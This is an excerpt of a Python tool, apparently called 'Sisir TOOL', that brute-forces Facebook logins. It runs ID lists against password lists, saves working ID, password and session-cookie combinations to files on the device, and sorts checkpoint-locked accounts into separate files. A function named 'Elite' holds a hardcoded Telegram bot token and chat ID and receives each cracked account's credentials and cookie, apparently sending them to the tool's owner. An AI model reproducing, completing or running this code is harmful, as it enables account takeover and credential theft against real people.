...
def Elite(ids,pas,cookie):
    try:
        import requests
        token = "6549381676:AAHzsi03FDTHD1GMrd_-jDteAGya8O_RuTM"
        chatid = "6463160850"
...
logo=("""\
   ...
   \x1b[1;91m┏━━━┳━━┳━━━┳━━┳━━━┓
      ...
      \x1b[1;95m┃┗━┛┣┫┣┫┗━┛┣┫┣┫┃┃┗┓
      \x1b[1;97m┗━━━┻━━┻━━━┻━━┻┛┗━┛
\x1b[37;41m\tWELLCOME TO Sisir TOOL\x1b[0;m\n\n\x1b[1;37m
\33[1;37m----------------------------------------------
→   Owner      :  SISIR
→   Facebook   :  SISIR
→   Github     :  Sisirr
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [sisir-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        open('/sdcard/sisir_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/sisir_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;91m [sisir-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/sisir-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/sisirbrand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [sisir-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                       ...
                                       # print("\033[1;32m [COOOKIS] :\033[1;32m "+cookie)
                                        open('/sdcard/sisir_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/sisir_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                     ...
                                     #   print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                        open('/sdcard/sisir_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/sisir_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
...
def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;32m [sisir-M1] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/sisir_R_COOKiE_M1.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/sisir-R-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [sisir-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/sisir-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [sisir-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                        open('/sdcard/sisir_R_COOKiE_M2.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/sisir-R-M2-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        Elite(uid,pas,cookie)
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;91mm [sisir-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/sisir-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
